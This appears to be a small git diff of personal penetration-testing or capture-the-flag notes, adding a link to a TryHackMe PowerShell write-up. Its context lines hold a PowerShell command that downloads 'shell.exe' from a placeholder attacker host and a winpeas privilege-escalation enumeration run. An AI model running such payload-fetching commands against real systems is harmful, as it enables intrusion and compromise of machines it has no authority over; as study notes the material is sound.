@@ -11,3 +11,7 @@ $ powershell -c "invoke-WebRequest -Uri 'http://<ip>:<port>/shell.exe' -OutFile 
 ```bash
 $ winpeas.exe cmd > output.txt
 ```
+
+## Powershell COmmands
+
+https://ratiros01.medium.com/tryhackme-hacking-with-powershell-bf6dbc5febc9
